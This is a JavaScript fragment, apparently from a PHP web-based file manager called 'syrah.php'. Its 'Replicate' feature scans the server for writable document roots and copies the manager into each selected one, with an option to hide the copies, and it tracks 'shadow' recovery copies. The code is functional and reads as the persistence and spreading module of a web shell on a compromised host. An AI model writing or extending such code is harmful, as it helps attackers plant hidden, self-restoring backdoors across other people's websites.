/* ── Replicate: copy this manager to other document roots ── */
let repRoots=[];
function repEsc(v){return String(v==null?'':v).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
function repShowRecovery(items){
  const box=document.getElementById('repRecovery');if(!box)return;
  if(!items||!items.length){box.innerHTML='<div style="font-weight:700;margin-bottom:4px">Recovery copies</div><div>No shadow copy yet.</div>';return;}
  box.innerHTML='<div style="font-weight:700;margin-bottom:4px">Recovery copies</div>'+items.map(x=>'<div style="word-break:break-all">'+(x.url?'<a href="'+repEsc(x.url)+'" target="_blank" rel="noopener" style="color:var(--link)">'+repEsc(x.url)+'</a>':repEsc(x.label))+'</div>').join('');
}
async function repScan(){
  const meta=document.getElementById('repMeta'),list=document.getElementById('repList'),out=document.getElementById('repOut');
  if(meta)meta.textContent='Scanning…';if(list)list.innerHTML='';if(out)out.textContent='';
  try{
    const d=await fetch('?x=replicate_scan',{cache:'no-store',credentials:'same-origin'}).then(r=>r.json());
    if(!d.ok)throw new Error(d.error||'Scan failed.');
    repRoots=d.roots||[];
    if(meta)meta.textContent='Home: '+(d.home||'')+' · '+repRoots.length+' writable folder(s)';
    if(list){
      if(!repRoots.length)list.innerHTML='<div style="padding:12px;color:var(--t3)">No writable document roots found.</div>';
      else list.innerHTML=repRoots.map(r=>'<label style="display:flex;gap:8px;align-items:flex-start;padding:8px 10px;border-bottom:1px solid var(--border)"><input type="checkbox" data-rep-path="'+repEsc(r.path)+'" checked><span style="min-width:0"><strong style="display:block;font-size:11.5px">'+repEsc(r.label)+(r.hasIndex?' · index.php var':'')+'</strong><span style="display:block;font-size:10.5px;color:var(--t3);word-break:break-all">'+repEsc(r.path)+'</span></span></label>').join('');
    }
    repShowRecovery(d.recovery||[]);
  }catch(e){if(meta)meta.textContent='Scan failed: '+(e&&e.message||e);}
}
document.getElementById('repClose')?.addEventListener('click',()=>closeMod('repOv'));
document.getElementById('replicateBtn')?.addEventListener('click',()=>{openMod('repOv');repScan();});
document.getElementById('repScan')?.addEventListener('click',repScan);
document.getElementById('repRun')?.addEventListener('click',async()=>{
  const btn=document.getElementById('repRun'),out=document.getElementById('repOut');
  const filename=(document.getElementById('repFilename')?.value||'syrah.php').trim();
  if(!/^[A-Za-z0-9._-]{1,80}\.php$/.test(filename)){toast('Replicate: invalid filename.',5000);return;}
  const paths=[...document.querySelectorAll('#repList input[type=checkbox]:checked')].map(x=>x.dataset.repPath);
  if(!paths.length){toast('Replicate: select at least one folder.',4000);return;}
  if(!confirm('Write '+filename+' to '+paths.length+' folder(s)? Existing files get a .bak copy.'))return;
  btn.disabled=true;if(out)out.textContent='Writing…';
  try{
    const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('filename',filename);fd.append('paths',JSON.stringify(paths));fd.append('hidden',document.getElementById('repHidden')?.checked?'1':'0');
    const d=await fetch('?x=replicate_run',{method:'POST',body:fd,credentials:'same-origin',cache:'no-store'}).then(r=>r.json());
    let text='';
    if(d.written&&d.written.length)text+='Written ('+d.written.length+'):\n'+d.written.join('\n');
    if(d.errors&&d.errors.length)text+=(text?'\n\n':'')+'Errors:\n'+d.errors.join('\n');
    if(out)out.textContent=text||'Nothing written.';
    const sd=await fetch('?x=shadow_recovery',{cache:'no-store',credentials:'same-origin'}).then(r=>r.json()).catch(()=>null);
    if(sd&&sd.items)repShowRecovery(sd.items);
  }catch(e){if(out)out.textContent='Replicate failed: '+(e&&e.message||e);}
  finally{btn.disabled=false;}
});

